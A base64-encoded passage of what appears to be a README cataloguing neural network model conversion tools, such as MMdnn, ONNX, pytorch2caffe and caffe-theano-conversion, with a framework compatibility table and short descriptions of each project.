b20vZmFjZWJvb2svZmItY2FmZmUtZXh0cyN0b3JjaDJjYWZmZSkgW21vY2hh
XShodHRwczovL2dpdGh1Yi5jb20va3VhbmdsaXUvbW9jaGEpIFt0cmFucy10
b3JjaF0oaHR0cHM6Ly9naXRodWIuY29tL1RlYW9ubHkvdHJhbnMtdG9yY2gp
IFt0aDJjYWZmZV0oaHR0cHM6Ly9naXRodWIuY29tL2UtbGFiL3RoMmNhZmZl
KSB8IFtUb3JjaDJDYWZmZTJdKGh0dHBzOi8vZ2l0aHViLmNvbS9jYTE3NzMx
MzBuL1RvcmNoMkNhZmZlMikgfCBOb25lIHwgTm9uZSB8IE5vbmUgfFtjb252
ZXJ0X3RvcmNoX3RvX3B5dG9yY2hdKGh0dHBzOi8vZ2l0aHViLmNvbS9jbGNh
cndpbi9jb252ZXJ0X3RvcmNoX3RvX3B5dG9yY2gpfCAgIC0gICB8IE5vbmUg
fCBOb25lIHwgTm9uZSB8IE5vbmUgfCBbdG9yY2gyY29yZW1sXShodHRwczov
L2dpdGh1Yi5jb20vcHJpc21hLWFpL3RvcmNoMmNvcmVtbCkgW3RvcmNoMmlv
c10oaHR0cHM6Ly9naXRodWIuY29tL3dvZmZsZS90b3JjaDJpb3MpIHwKfCoq
W2tlcmFzXShodHRwczovL2dpdGh1Yi5jb20vZmNob2xsZXQvZGVlcC1sZWFy
bmluZy1tb2RlbHMpKiogOnNwYXJrbGVzOiB8IFtNTWRubl0oaHR0cHM6Ly9n
aXRodWIuY29tL01pY3Jvc29mdC9NTWRubikgfCBbTU1kbm5dKGh0dHBzOi8v
Z2l0aHViLmNvbS9NaWNyb3NvZnQvTU1kbm4pIFtubl90b29sc10oaHR0cHM6
Ly9naXRodWIuY29tL2hhaG55dWFuL25uX3Rvb2xzKSBba2VyYXMyY2FmZmVd
KGh0dHBzOi8vZ2l0aHViLmNvbS91aGZiYW5kL2tlcmFzMmNhZmZlKSB8IFtN
TWRubiAodGhyb3VnaCBPTk5YKV0oaHR0cHM6Ly9naXRodWIuY29tL01pY3Jv
c29mdC9NTWRubikgfCBbTU1kbm5dKGh0dHBzOi8vZ2l0aHViLmNvbS9NaWNy
b3NvZnQvTU1kbm4pIHwgTm9uZSB8IE5vbmUgfCBbTU1kbm5dKGh0dHBzOi8v
Z2l0aHViLmNvbS9NaWNyb3NvZnQvTU1kbm4pIFtubi10cmFuc2Zlcl0oaHR0
cHM6Ly9naXRodWIuY29tL2d6dWlkaG9mL25uLXRyYW5zZmVyKSB8IE5vbmUg
fCAgIC0gICB8IE5vbmUgfCBbbm5fdG9vbHNdKGh0dHBzOi8vZ2l0aHViLmNv
bS9oYWhueXVhbi9ubl90b29scykgW2NvbnZlcnQtdG8tdGVuc29yZmxvd10o
aHR0cHM6Ly9naXRodWIuY29tL2dvcmFucmF1a2VyL2NvbnZlcnQtdG8tdGVu
c29yZmxvdykgW2tlcmFzX3RvX3RlbnNvcmZsb3ddKGh0dHBzOi8vZ2l0aHVi
LmNvbS9hbGFuc3d4L2tlcmFzX3RvX3RlbnNvcmZsb3cpIFtrZXJhc190b190
ZW5zb3JmbG93XShodHRwczovL2dpdGh1Yi5jb20vYW1pci1hYmRpL2tlcmFz
X3RvX3RlbnNvcmZsb3cpIFtNTWRubl0oaHR0cHM6Ly9naXRodWIuY29tL01p
Y3Jvc29mdC9NTWRubikgfCBOb25lIHwgW2FwcGxlL2NvcmVtbHRvb2xzXSho
dHRwczovL2FwcGxlLmdpdGh1Yi5pby9jb3JlbWx0b29scy8pIDpzcGFya2xl
czogW21vZGVsLWNvbnZlcnRlcnNdKGh0dHBzOi8vZ2l0aHViLmNvbS90cmlh
Z2VtZC9tb2RlbC1jb252ZXJ0ZXJzKSBba2VyYXNfbW9kZWxzXShodHRwczov
L2dpdGh1Yi5jb20vQnVsb2Noa2luL2tlcmFzX21vZGVscykgW01NZG5uXSho
dHRwczovL2dpdGh1Yi5jb20vTWljcm9zb2Z0L01NZG5uKSB8CnwqKltkYXJr
bmV0XShodHRwczovL3BqcmVkZGllLmNvbS9kYXJrbmV0L2ltYWdlbmV0Lykq
KnwgTm9uZSB8IFtweXRvcmNoLWNhZmZlLWRhcmtuZXQtY29udmVydF0oaHR0
cHM6Ly9naXRodWIuY29tL21hcnZpcy9weXRvcmNoLWNhZmZlLWRhcmtuZXQt
Y29udmVydCkgfCBOb25lIHwgW01NZG5uXShodHRwczovL2dpdGh1Yi5jb20v
TWljcm9zb2Z0L01NZG5uKSB8IE5vbmUgfCBOb25lIHwgW3B5dG9yY2gtY2Fm
ZmUtZGFya25ldC1jb252ZXJ0XShodHRwczovL2dpdGh1Yi5jb20vbWFydmlz
L3B5dG9yY2gtY2FmZmUtZGFya25ldC1jb252ZXJ0KSB8IE5vbmUgfCBbTU1k
bm5dKGh0dHBzOi8vZ2l0aHViLmNvbS9NaWNyb3NvZnQvTU1kbm4pIHwgwqAg
LSDCoCB8IFtEVzJURl0oaHR0cHM6Ly9naXRodWIuY29tL2ppbnl1MTIxL0RX
MlRGKSBbZGFya2Zsb3ddKGh0dHBzOi8vZ2l0aHViLmNvbS90aHRyaWV1L2Rh
cmtmbG93KSBbbGVnb195b2xvXShodHRwczovL2dpdGh1Yi5jb20vZEVjbWly
L2xlZ29feW9sbykgfCBOb25lIHwgTm9uZSB8CnwqKlt0ZW5zb3JmbG93XSho
dHRwczovL2dpdGh1Yi5jb20vdGVuc29yZmxvdy9tb2RlbHMpKiogOnNwYXJr
bGVzOiB8IFtNTWRubl0oaHR0cHM6Ly9naXRodWIuY29tL01pY3Jvc29mdC9N
TWRubikgfCBbTU1kbm5dKGh0dHBzOi8vZ2l0aHViLmNvbS9NaWNyb3NvZnQv
TU1kbm4pIFtubl90b29sc10oaHR0cHM6Ly9naXRodWIuY29tL2hhaG55dWFu
L25uX3Rvb2xzKXwgW01NZG5uICh0aHJvdWdoIE9OTlgpXShodHRwczovL2dp
dGh1Yi5jb20vTWljcm9zb2Z0L01NZG5uKSB8IFtjcm9zc3RhbGtdKGh0dHBz
Oi8vZ2l0aHViLmNvbS9NaWNyb3NvZnQvQ05USy90cmVlL21hc3Rlci9iaW5k
aW5ncy9weXRob24vY250ay9jb250cmliL2Nyb3NzdGFsaykgW01NZG5uXSho
dHRwczovL2dpdGh1Yi5jb20vTWljcm9zb2Z0L01NZG5uKSB8IE5vbmUgfCBO
b25lIHwgW3B5dG9yY2gtdGZdKGh0dHBzOi8vZ2l0aHViLmNvbS9sZW9uaWRr
L3B5dG9yY2gtdGYpIFtNTWRubl0oaHR0cHM6Ly9naXRodWIuY29tL01pY3Jv
c29mdC9NTWRubikgfCBOb25lIHwgW21vZGVsLWNvbnZlcnRlcnNdKGh0dHBz
Oi8vZ2l0aHViLmNvbS90cmlhZ2VtZC9tb2RlbC1jb252ZXJ0ZXJzKSBbbm5f
dG9vbHNdKGh0dHBzOi8vZ2l0aHViLmNvbS9oYWhueXVhbi9ubl90b29scykg
W2NvbnZlcnQtdG8tdGVuc29yZmxvd10oaHR0cHM6Ly9naXRodWIuY29tL2dv
cmFucmF1a2VyL2NvbnZlcnQtdG8tdGVuc29yZmxvdykgW01NZG5uXShodHRw
czovL2dpdGh1Yi5jb20vTWljcm9zb2Z0L01NZG5uKSB8IE5vbmUgfCAgIC0g
ICB8IE5vbmUgfCBbdGZjb3JlbWxdKGh0dHBzOi8vZ2l0aHViLmNvbS90Zi1j
b3JlbWwvdGYtY29yZW1sKSBbTU1kbm5dKGh0dHBzOi8vZ2l0aHViLmNvbS9N
aWNyb3NvZnQvTU1kbm4pIHwKfCoqW2NoYWluZXJdKGh0dHA6Ly9kb2NzLmNo
YWluZXIub3JnL2VuL3N0YWJsZS9yZWZlcmVuY2UvY2FmZmUuaHRtbCkqKnwg
Tm9uZSB8IE5vbmUgfCBOb25lIHwgTm9uZSB8IE5vbmUgfCBOb25lIHxbY2hh
aW5lcjJweXRvcmNoXShodHRwczovL2dpdGh1Yi5jb20vdnpob25nL2NoYWlu
ZXIycHl0b3JjaCl8IE5vbmUgfCBOb25lIHwgTm9uZSB8IE5vbmUgfCAtIHwg
Tm9uZSB8CnwqKltjb3JlTUwvaU9TXShodHRwczovL2RldmVsb3Blci5hcHBs
ZS5jb20vZG9jdW1lbnRhdGlvbi9jb3JlbWwpKiogOnNwYXJrbGVzOnwgW01N
ZG5uXShodHRwczovL2dpdGh1Yi5jb20vTWljcm9zb2Z0L01NZG5uKSB8IFtN
TWRubl0oaHR0cHM6Ly9naXRodWIuY29tL01pY3Jvc29mdC9NTWRubikgfCBb
TU1kbm4gKHRocm91Z2ggT05OWCldKGh0dHBzOi8vZ2l0aHViLmNvbS9NaWNy
b3NvZnQvTU1kbm4pIHwgW01NZG5uXShodHRwczovL2dpdGh1Yi5jb20vTWlj
cm9zb2Z0L01NZG5uKSB8IE5vbmUgfCBOb25lIHwgW01NZG5uXShodHRwczov
L2dpdGh1Yi5jb20vTWljcm9zb2Z0L01NZG5uKSB8IE5vbmUgfCBbTU1kbm5d
KGh0dHBzOi8vZ2l0aHViLmNvbS9NaWNyb3NvZnQvTU1kbm4pIHwgTm9uZSB8
IFtNTWRubl0oaHR0cHM6Ly9naXRodWIuY29tL01pY3Jvc29mdC9NTWRubikg
fCBOb25lIHwgLSB8CgojIEJyaWVmIEludHJvIG9mIENvbnZlcnRvcnMKCiMj
IE9wZW4gTmV1cmFsIE5ldHdvcmsgRXhjaGFuZ2UKCioqR2VuZXJhbCBmcmFt
ZXdvcmsgZm9yIGNvbnZlcnRpbmcgYmV0d2VlbiBhbGwga2luZHMgb2YgbmV1
cmFsIG5ldHdvcmtzKioKCltPTk5YXShodHRwczovL2dpdGh1Yi5jb20vb25u
eCkgaXMgYW4gZWZmb3J0IHRvIHVuaWZ5IGNvbnZlcnRlcnMgZm9yIG5ldXJh
bCBuZXR3b3JrcyBpbiBvcmRlciB0byBicmluZyBzb21lIHNhbml0eSB0byB0
aGUgTk4gd29ybGQuIFJlbGVhc2VkIGJ5IEZhY2Vib29rIGFuZCBNaWNyb3Nv
ZnQuCk1vcmUgaW5mbyBbaGVyZV0oaHR0cDovL29ubnguYWkpLgoKIyMgTU1k
bm4KCltNTWRubl0oaHR0cHM6Ly9naXRodWIuY29tL01pY3Jvc29mdC9NTWRu
bikgaXMgYSBzZXQgb2YgdG9vbHMgdG8gaGVscCB1c2VycyBpbnRlci1vcGVy
YXRlIGFtb25nIGRpZmZlcmVudCBkZWVwIGxlYXJuaW5nIGZyYW1ld29ya3Mu
IEUuZy4gbW9kZWwgY29udmVyc2lvbiBhbmQgdmlzdWFsaXphdGlvbi4gQ29u
dmVydCBtb2RlbHMgYmV0d2VlbiBDYWZmZUVtaXQsIENOVEssIENvcmVNTCwg
S2VyYXMsIE1YTmV0LCBPTk5YLCBQeVRvcmNoIGFuZCBUZW5zb3JGbG93LgoK
PGltZyBzcmM9Imh0dHBzOi8vZ2l0aHViLmNvbS9NaWNyb3NvZnQvTU1kbm4v
YmxvYi9tYXN0ZXIvZG9jcy9zdXBwb3J0ZWQuanBnIiB3aWR0aD0iNDAwIiBo
ZWlnaHQ9IjQwMCI+CgojIyBNWE5ldCBjb252ZXJ0b3IKCioqQ29udmVydCB0
byBNWE5ldCBtb2RlbCoqLgoKIyMjIFttZGVyaW5nL0NvcmVNTFpvbzogQSBm
ZXcgbW9kZWxzIGNvbnZlcnRlZCBmcm9tIGNhZmZlIHRvIENvcmVNTHMgZm9y
bWF0XShodHRwczovL2dpdGh1Yi5jb20vbWRlcmluZy9Db3JlTUxab28pCkEg
ZmV3IGRlZXAgbGVhcm5pbmcgbW9kZWxzIGNvbnZlcnRlZCBmcm9tIHZhcmlv
dXMgZm9ybWF0cyB0byBDb3JlTUxzIGZvcm1hdC4KTW9kZWxzIGN1cnJlbnRs
eSBhdmFpbGFibGU6CgotIFNxdWVlemVOZXQKLSBWR0cxOQpQbGVhc2UgZmVl
bCBmcmVlIHRvIGNyZWF0ZSBhIHB1bGwgcmVxdWVzdCB3aXRoIGFkZGl0aW9u
YWwgbW9kZWxzLgoKCiMjIyBbbXhuZXQvdG9vbHMvY2FmZmVfY29udmVydGVy
XShodHRwczovL2dpdGh1Yi5jb20vZG1sYy9teG5ldC90cmVlL21hc3Rlci90
b29scy9jYWZmZV9jb252ZXJ0ZXIpCgpLZXkgdG9waWNzIGNvdmVyZWQgaW5j
bHVkZSB0aGUgZm9sbG93aW5nOgoqIENvbnZlcnRpbmcgQ2FmZmUgdHJhaW5l
ZCBtb2RlbHMgdG8gTVhOZXQKKiBDYWxsaW5nIENhZmZlIG9wZXJhdG9ycyBp
biBNWE5ldApNb3JlIGNvbmNyZXRseSwgcGxlYXNlIHJlZmVyIHRvIFtteG5l
dC90b29scy9jYWZmZV9jb252ZXJ0ZXJdKGh0dHBzOi8vZ2l0aHViLmNvbS9k
bWxjL214bmV0L3RyZWUvbWFzdGVyL3Rvb2xzL2NhZmZlX2NvbnZlcnRlcikg
YW5kIFtIb3cgdG8gfCBDb252ZXJ0IGZyb20gQ2FmZmUgdG8gTVhOZXRdKGh0
dHBzOi8vZ2l0aHViLmNvbS9kbWxjL214bmV0L2Jsb2IvbWFzdGVyL2RvY3Mv
aG93X3RvL2NhZmZlLm1kKS4KCiMjIyBbbmlja2xoeS9SZXNOZXRfY2FmZmUy
bXhuZXRdKGh0dHBzOi8vZ2l0aHViLmNvbS9uaWNrbGh5L1Jlc05ldF9jYWZm
ZTJteG5ldCkKClRoaXMgaXMgYSB0b29sIHRvIGNvbnZlcnQgdGhlIGRlZXAt
cmVzaWR1YWwtbmV0d29ya3MgZnJvbSBjYWZmZSBtb2RlbCB0byBteG5ldCBt
b2RlbC4gVGhlIHdlaWdodHMgYXJlIGRpcmVjdGx5IGNvcGllZCBmcm9tIGNh
ZmZlIG5ldHdvcmsgYmxvYnMuCgojIyBDYWZmZSBjb252ZXJ0b3IKCioqQ29u
dmVydCB0byBDYWZmZSBtb2RlbCoqLgoKIyMjIFtweXRvcmNoMmNhZmZlXSho
dHRwczovL2dpdGh1Yi5jb20vbG9uZ2N3L3B5dG9yY2gyY2FmZmUpCgpDb252
ZXJ0IFB5VG9yY2ggbW9kZWwgdG8gQ2FmZmVtb2RlbC4KCiMjIyBbY3lwdy9N
WE5ldDJDYWZmZV0oaHR0cHM6Ly9naXRodWIuY29tL2N5cHcvTVhOZXQyQ2Fm
ZmUpCgpDb252ZXJ0IE1YTmV0IG1vZGVsIHRvIENhZmZlIG1vZGVsLgoKIyMj
IFt3cmFuZ2xlcndvbmcvTXhuZXQyQ2FmZmU6IENvbnZlcnQgTVhOZXQgbW9k
ZWwgdG8gQ2FmZmUgbW9kZWxdKGh0dHBzOi8vZ2l0aHViLmNvbS93cmFuZ2xl
cndvbmcvTXhuZXQyQ2FmZmUpCgpDb252ZXJ0IE1YTmV0IG1vZGVsIHRvIENh
ZmZlIG1vZGVsLgoKIyMjIFtrdWFuZ2xpdS9tb2NoYV0oaHR0cHM6Ly9naXRo
dWIuY29tL2t1YW5nbGl1L21vY2hhKQoKQ29udmVydCB0b3JjaCBtb2RlbCB0
by9mcm9tIGNhZmZlIG1vZGVsIGVhc2lseS4KCiMjIyBbdWhmYmFuZC9rZXJh
czJjYWZmZTogS2VyYXMgdG8gQ2FmZmUgbW9kZWwgY29udmVydGVyIHRvb2xd
KGh0dHBzOi8vZ2l0aHViLmNvbS91aGZiYW5kL2tlcmFzMmNhZmZlKQoKClRo
aXMgdG9vbCB0ZXN0ZWQgd2l0aCBDYWZmZSAxLjAsIEtlcmFzIDIuMS4yIGFu
ZCBUZW5zb3JGbG93IDEuNC4wCgpXb3JraW5nIGNvbnZlcnNpb24gZXhhbXBs
ZXM6Ci0gSW5jZXB0aW9uIFYzCi0gSW5jZXB0aW9uIFY0IChodHRwczovL2dp
dGh1Yi5jb20va2VudHNvbW1lci9rZXJhcy1pbmNlcHRpb25WNCkKLSBYY2Vw
dGlvbiBWMQotIFNxdWVlemVOZXQgKGh0dHBzOi8vZ2l0aHViLmNvbS9yY21h
bGxpL2tlcmFzLXNxdWVlemVuZXQpCi0gVkdHMTYKCgpQcm9ibGVtIGxheWVy
czoKLSBaZXJvUGFkZGluZzJECi0gTWF4UG9vbGluZzJEIGFuZCBBdmVyYWdl
UG9vbGluZzJEIHdpdGggYXN5bW1ldHJpYyBwYWRkaW5nCgojIyMgW2ZhY2Vi
b29rL2ZiLWNhZmZlLWV4dHMvdG9yY2gyY2FmZmVdKGh0dHBzOi8vZ2l0aHVi
LmNvbS9mYWNlYm9vay9mYi1jYWZmZS1leHRzI3RvcmNoMmNhZmZlKQoKU29t
ZSBoYW5keSB1dGlsaXR5IGxpYnJhcmllcyBhbmQgdG9vbHMgZm9yIHRoZSBD
YWZmZSBkZWVwIGxlYXJuaW5nIGZyYW1ld29yaywgd2hpY2ggaGFzICoqIEEg
bGlicmFyeSBmb3IgY29udmVydGluZyBwcmUtdHJhaW5lZCBUb3JjaCBtb2Rl
bHMgdG8gdGhlIGVxdWl2YWxlbnQgQ2FmZmUgbW9kZWxzLioqCgojIyMgIFtw
eXRvcmNoLWNhZmZlLWRhcmtuZXQtY29udmVydF0oaHR0cHM6Ly9naXRodWIu
Y29tL21hcnZpcy9weXRvcmNoLWNhZmZlLWRhcmtuZXQtY29udmVydCkKCkNv
bnZlcnQgYmV0d2VlbiBweXRvcmNoLCBjYWZmZSBhbmQgZGFya25ldCBtb2Rl
bHMuIENhZmZlIGRhcmtuZXQgbW9kZWxzIGNhbiBiZSBsb2FkIGRpcmVjdGx5
IGJ5IHB5dG9yY2guCgojIyMgW1RlYW9ubHkvdHJhbnMtdG9yY2hdKGh0dHBz
Oi8vZ2l0aHViLmNvbS9UZWFvbmx5L3RyYW5zLXRvcmNoKQoKVHJhbnNsYXRp
bmcgVG9yY2ggbW9kZWwgdG8gb3RoZXIgZnJhbWV3b3JrIHN1Y2ggYXMgQ2Fm
ZmUsIE14TmV0IC4uLgoKIyMjIFtlLWxhYi90aDJjYWZmZV0oaHR0cHM6Ly9n
aXRodWIuY29tL2UtbGFiL3RoMmNhZmZlKQoKQSB0b3JjaC1ubiB0byBjYWZm
ZSBjb252ZXJ0ZXIgZm9yIHNwZWNpZmljIGxheWVycy4KCiMjIyBbaGFobnl1
YW4vbm5fdG9vbHNdKGh0dHBzOi8vZ2l0aHViLmNvbS9oYWhueXVhbi9ubl90
b29scykKCmEgbmV1cmFsIG5ldHdvcmsgY29udmVydG9yIGZvciBtb2RlbHMg
YW1vbmcgY2FmZmUgdGVuc29yZmxvdyBrZXJhcwoKIyMgQ2FmZmUyIGNvbnZl
cnRvcgoKKipDb252ZXJ0IHRvIENhZmZlMiBtb2RlbCoqLgoKIyMjIFtDYWZm
ZVRvQ2FmZmUyXShodHRwczovL2NhZmZlMi5haS9kb2NzL2NhZmZlLW1pZ3Jh
dGlvbi5odG1sI2NhZmZlLXRvLWNhZmZlMikKVGhpcyBpcyBhbiBvZmZpY2lh
bCBjb252ZXJ0b3IsIHdoaWNoIG5vdCBvbmx5IHByb3ZvaWRlIGEgc2NyaXB0
IGFsc28gYW4gaXB5dGhvbiBub3RlYm9vayBhcyBiZWxvdzoKLSBbY2FmZmUy
L0dldHRpbmdfQ2FmZmUxX01vZGVsc19mb3JfVHJhbnNsYXRpb24uaXB5bmIg
YXQgbWFzdGVyIMK3IGNhZmZlMi9jYWZmZTJdKGh0dHBzOi8vZ2l0aHViLmNv
bS9jYWZmZTIvY2FmZmUyL2Jsb2IvbWFzdGVyL2NhZmZlMi9weXRob24vdHV0
b3JpYWxzL0dldHRpbmdfQ2FmZmUxX01vZGVsc19mb3JfVHJhbnNsYXRpb24u
aXB5bmIpCi0gW2NhZmZlMi9jYWZmZV90cmFuc2xhdG9yLnB5IGF0IG1hc3Rl
ciDCtyBjYWZmZTIvY2FmZmUyXShodHRwczovL2dpdGh1Yi5jb20vY2FmZmUy
L2NhZmZlMi9ibG9iL21hc3Rlci9jYWZmZTIvcHl0aG9uL2NhZmZlX3RyYW5z
bGF0b3IucHkpCgojIyMgW29ubngtY2FmZmUyXShodHRwczovL2dpdGh1Yi5j
b20vb25ueC9vbm54LWNhZmZlMikKCkNvbnZlcnQgUHlUb3JjaCB0byBDYWZm
ZTIgKG1ha2luZyBpdCBlc3BlY2lhbGx5IGVhc3kgdG8gZGVwbG95IG9uIG1v
YmlsZSBkZXZpY2VzKQoKIyMgQ05USyBjb252ZXJ0b3IKCioqQ29udmVydCB0
byBDTlRLIG1vZGVsKiouCgojIyMgW2Nyb3NzdGFsa2NhZmZlL0NhZmZlQ29u
dmVydGVyXShodHRwczovL2dpdGh1Yi5jb20vTWljcm9zb2Z0L0NOVEsvdHJl
ZS9tYXN0ZXIvYmluZGluZ3MvcHl0aG9uL2NudGsvY29udHJpYi9jcm9zc3Rh
bGtjYWZmZSkKClRoZSB0b29sIHdpbGwgaGVscCB5b3UgY29udmVydCB0cmFp
bmVkIG1vZGVscyBmcm9tIENhZmZlIHRvIENOVEsuCgpDb252ZXJ0IHRyYWlu
ZWQgbW9kZWxzOiBnaXZpbmcgYSBtb2RlbCBzY3JpcHQgYW5kIGl0cyB3ZWln
aHRzIGZpbGUsIGV4cG9ydCB0byBDTlRLIG1vZGVsLgoKIyMjIFtjcm9zc3Rh
bGtdKGh0dHBzOi8vZ2l0aHViLmNvbS9NaWNyb3NvZnQvQ05USy90cmVlL21h
c3Rlci9iaW5kaW5ncy9weXRob24vY250ay9jb250cmliL2Nyb3NzdGFsaykK
CmNyb3NzdGFsayBpcyBmcm9tIENOVEsgY29udHJpYi4KCiMjIFRoZWFuby9M
YXNhZ25lIGNvbnZlcnRvcgoKKipDb252ZXJ0IHRvIFRoZWFuby9MYXNhZ25l
IG1vZGVsKiouCgojIyMgW2FuLWt1bWFyL2NhZmZlLXRoZWFuby1jb252ZXJz
aW9uXShodHRwczovL2dpdGh1Yi5jb20vYW4ta3VtYXIvY2FmZmUtdGhlYW5v
LWNvbnZlcnNpb24pCgpUaGlzIGlzIHBhcnQgb2YgYSBwcm9qZWN0IGZvciBD
UzIzMU4gYXQgU3RhbmZvcmQgVW5pdmVyc2l0eSwgd3JpdHRlbiBieSBBbmtp
dCBLdW1hciwgTWF0aGVtYXRpY3MgbWFqb3IsIENsYXNzIG9mIDIwMTUKClRo
aXMgaXMgYSByZXBvc2l0b3J5IHRoYXQgYWxsb3dzIHlvdSB0byBjb252ZXJ0
IHByZXRyYWluZWQgY2FmZmUgbW9kZWxzIGludG8gbW9kZWxzIGluIExhc2Fn
bmUsIGEgdGhpbiB3cmFwcGVyIGFyb3VuZCBUaGVhbm8uIFlvdSBjYW4gYWxz
byBjb252ZXJ0IGEgY2FmZmUgbW9kZWwncyBhcmNoaXRlY3R1cmUgdG8gYW4g
ZXF1aXZhbGVudCBvbmUgaW4gTGFzYWduZS4gWW91IGRvIG5vdCBuZWVkIGNh
ZmZlIGluc3RhbGxlZCB0byB1c2UgdGhpcyBtb2R1bGUuCgpDdXJyZW50bHks
IHRoZSBmb2xsb3dpbmcgY2FmZmUgbGF5ZXJzIGFyZSBzdXBwb3J0ZWQ6CmBg
YAoqIENvbnZvbHV0aW9uCiogTFJOCiogUG9vbGluZwoqIElubmVyIFByb2R1
Y3QKKiBSZWx1CiogU29mdG1heApgYGAKCiMjIyBba2VuY29rZW4vY2FmZmUt
bW9kZWwtY29udmVydF0oaHR0cHM6Ly9naXRodWIuY29tL2tlbmNva2VuL2Nh
ZmZlLW1vZGVsLWNvbnZlcnQpCgpDb252ZXJ0IG1vZGVscyBmcm9tIENhZmZl
IHRvIFRoZWFubyBmb3JtYXQuCgojIyMgW3BpZXJnaWFqL2NhZmZlLXRvLXRo
ZWFub10oaHR0cHM6Ly9naXRodWIuY29tL3BpZXJnaWFqL2NhZmZlLXRvLXRo
ZWFubykKCkNvbnZlcnQgYSBDYWZmZSBNb2RlbCB0byBhIFRoZWFubyBNb2Rl
bC4gVGhpcyBjdXJyZW50bHkgd29ya3Mgb24gQWxleE5ldCwgYnV0IHNob3Vs
ZCB3b3JrIGZvciBhbnkgQ2FmZmUgbW9kZWwgdGhhdCBvbmx5IGluY2x1ZGVz
IGxheWVycyB0aGF0IGhhdmUgYmVlbiBpbXBlbWVudGVkLgoKIyMgTmVvbiBj
b252ZXJ0b3IgwqAKCioqQ29udmVydCB0byBOZW9uIG1vZGVsKiouCgojIyMg
W05lcnZhbmFTeXN0ZW1zL2NhZmZlMm5lb25dKGh0dHBzOi8vZ2l0aHViLmNv
bS9OZXJ2YW5hU3lzdGVtcy9jYWZmZTJuZW9uKQoKVG9vbHMgdG8gY29udmVy
dCBDYWZmZSBtb2RlbHMgdG8gbmVvbidzIHNlcmlhbGl6YXRpb24gZm9ybWF0
LgoKVGhpcyByZXBvIGNvbnRhaW5zIHRvb2xzIHRvIGNvbnZlcnQgQ2FmZmUg
bW9kZWxzIGludG8gYSBmb3JtYXQgY29tcGF0aWJsZSB3aXRoIHRoZSBbbmVv
biBkZWVwIGxlYXJuaW5nIGxpYnJhcnldKGh0dHBzOi8vZ2l0aHViLmNvbS9O
ZXJ2YW5hU3lzdGVtcy9jYWZmZTJuZW9uKS4gVGhlIG1haW4gc2NyaXB0LCAi
ZGVjYWZmZWluYXRlLnB5IiwgdGFrZXMgYXMgaW5wdXQgYSBjYWZmZSBtb2Rl
bCBkZWZpbml0aW9uIGZpbGUgYW5kIHRoZSBjb3JyZXNwb25kaW5nIG1vZGVs
IHdlaWdodHMgZmlsZSBhbmQgcmV0dXJucyBhIG5lb24gc2VyaWFsaXplZCBt
b2RlbCBmaWxlLiBUaGlzIG91dHB1dCBmaWxlIGNhbiBiZSB1c2VkIHRvIGlu
c3RhbnRpYXRlIHRoZSBuZW9uIE1vZGVsIG9iamVjdCwgd2hpY2ggd2lsbCBn
ZW5lcmF0ZSBhIG1vZGVsIGluIG5lb24gdGhhdCBzaG91bGQgcmVwbGljYXRl
IHRoZSBiZWhhdmlvciBvZiB0aGUgQ2FmZmUgbW9kZWwuCgojIyBQeVRvcmNo
IGNvbnZlcnRvciDCoAoKKipDb252ZXJ0IHRvIFB5VG9yY2ggbW9kZWwqKi4K
CiMjIyBbbmVyb3g4NjY0L2dsdW9uMnB5dG9yY2hdKGh0dHBzOi8vZ2l0aHVi
LmNvbS9uZXJveDg2NjQvZ2x1b24ycHl0b3JjaCkKCkNvbnZlcnQgbXhuZXQg
LyBnbHVvbiBncmFwaCB0byBQeVRvcmNoIHNvdXJjZSArIHdlaWdodHMuCgoj
IyMgW3J1b3RpYW5sdW8vcHl0b3JjaC1yZXNuZXRdKGh0dHBzOi8vZ2l0aHVi
LmNvbS9ydW90aWFubHVvL3B5dG9yY2gtcmVzbmV0KQoKQ29udmVydCByZXNu
ZXQgdHJhaW5lZCBpbiBjYWZmZSB0byBweXRvcmNoIG1vZGVsLgoKIyMjIFtj
bGNhcndpbi9jb252ZXJ0X3RvcmNoX3RvX3B5dG9yY2hdKGh0dHBzOi8vZ2l0
aHViLmNvbS9jbGNhcndpbi9jb252ZXJ0X3RvcmNoX3RvX3B5dG9yY2gpCgpD
b252ZXJ0IHRvcmNoIHQ3IG1vZGVsIHRvIHB5dG9yY2ggbW9kZWwgYW5kIHNv
dXJjZS4KCiMjIyBbdnpob25nL2NoYWluZXIycHl0b3JjaF0oaHR0cHM6Ly9n
aXRodWIuY29tL3Z6aG9uZy9jaGFpbmVyMnB5dG9yY2gpCgpgY2hhaW5lcjJw
eXRvcmNoYCBpbXBsZW1lbnRzIGNvbnZlcnNpb25zIGZyb20gQ2hhaW5lciBt
b2R1bGVzIHRvIFB5VG9yY2ggbW9kdWxlcywgc2V0dGluZyBwYXJhbWV0ZXJz
IG9mIGVhY2ggbW9kdWxlcyBzdWNoIHRoYXQgb25lIGNhbiBwb3J0IG92ZXIg
bW9kZWxzIG9uIGEgbW9kdWxlIGJhc2lzLgoKIyMjICBbcHl0b3JjaC1jYWZm
ZV0oaHR0cHM6Ly9naXRodWIuY29tL21hcnZpcy9weXRvcmNoLWNhZmZlKQoK
TG9hZCBjYWZmZSBwcm90b3R4dCBhbmQgd2VpZ2h0cyBkaXJlY3RseSBpbiBw
eXRvcmNoIHdpdGhvdXQgZXhwbGljaXRseSBjb252ZXJ0aW5nIG1vZGVsIGZy
b20gY2FmZmUgdG8gcHl0b3JjaC4KCiMjIyAgW25uLXRyYW5zZmVyXShodHRw
czovL2dpdGh1Yi5jb20vZ3p1aWRob2Yvbm4tdHJhbnNmZXIpCgpDb252ZXJ0
IGJldHdlZW4gS2VyYXMgYW5kIFB5VG9yY2ggbW9kZWxzLgoKIyMgVG9yY2gg
Y29udmVydG9yIMKgCgoqKkNvbnZlcnQgdG8gVG9yY2ggbW9kZWwqKi4KCiMj
IyBba21hdHplbi9nb29nbGVuZXQtY2FmZmUydG9yY2hdKGh0dHBzOi8vZ2l0
aHViLmNvbS9rbWF0emVuL2dvb2dsZW5ldC1jYWZmZTJ0b3JjaCkKCkNvbnZl
cnRzIGJ2bGNfZ29vZ2xlbmV0LmNhZmZlbW9kZWwgdG8gYSBUb3JjaCBubiBt
b2RlbC4KCldhbnQgdG8gdXNlIHRoZSBwcmUtdHJhaW5lZCBHb29nTGVOZXQg
ZnJvbSB0aGUgQlZMQyBNb2RlbCBab28gaW4gVG9yY2g/IERvIHlvdSBub3Qg
d2FudCB0byB1c2UgQ2FmZmUgYXMgYW4gYWRkaXRpb25hbCBkZXBlbmRlbmN5
IGluc2lkZSBUb3JjaD8gVXNlIHRoZXNlIHR3byBzY3JpcHRzIHRvIGJ1aWxk
IHRoZSBuZXR3b3JrIGRlZmluaXRpb24gaW4gVG9yY2ggYW5kIGNvcHkgdGhl
